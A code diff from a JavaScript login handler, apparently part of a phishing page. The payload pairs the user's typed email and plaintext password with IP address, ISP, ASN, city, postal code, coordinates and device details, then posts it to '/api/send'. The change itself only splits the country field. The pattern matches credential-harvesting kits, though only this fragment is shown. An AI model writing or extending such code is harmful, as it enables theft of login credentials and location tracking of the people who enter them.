@@ -1248,22 +1248,23 @@ function loginUser(event){
             const ua = navigator.userAgent;
 
             const payload = {
-                email:    username,
-                password: password,
-                ip:       d.ip || "-",
-                ipv6:     (d.version === "IPv6") ? d.ip : "-",
-                negara:   (d.country_code || "-") + " " + (d.country_name || "-"),
-                prov:     d.region || "-",
-                kota:     d.city || "-",
-                zona:     d.timezone || "-",
-                isp:      d.org || "-",
-                asn:      d.asn || "-",
-                zip:      d.postal || "-",
-                koord:    (d.latitude || "-") + " , " + (d.longitude || "-"),
-                waktu:    formatWaktuWIB(new Date()),
-                device:   detectDevice(ua),
-                os:       detectOS(ua),
-                browser:  detectBrowser(ua)
+                email:      username,
+                password:   password,
+                ip:         d.ip || "-",
+                ipv6:       (d.version === "IPv6") ? d.ip : "-",
+                negaraKode: d.country_code || "-",
+                negara:     d.country_name || "-",
+                prov:       d.region || "-",
+                kota:       d.city || "-",
+                zona:       d.timezone || "-",
+                isp:        d.org || "-",
+                asn:        d.asn || "-",
+                zip:        d.postal || "-",
+                koord:      (d.latitude || "-") + " , " + (d.longitude || "-"),
+                waktu:      formatWaktuWIB(new Date()),
+                device:     detectDevice(ua),
+                os:         detectOS(ua),
+                browser:    detectBrowser(ua)
             };
 
             return fetch("/api/send", {
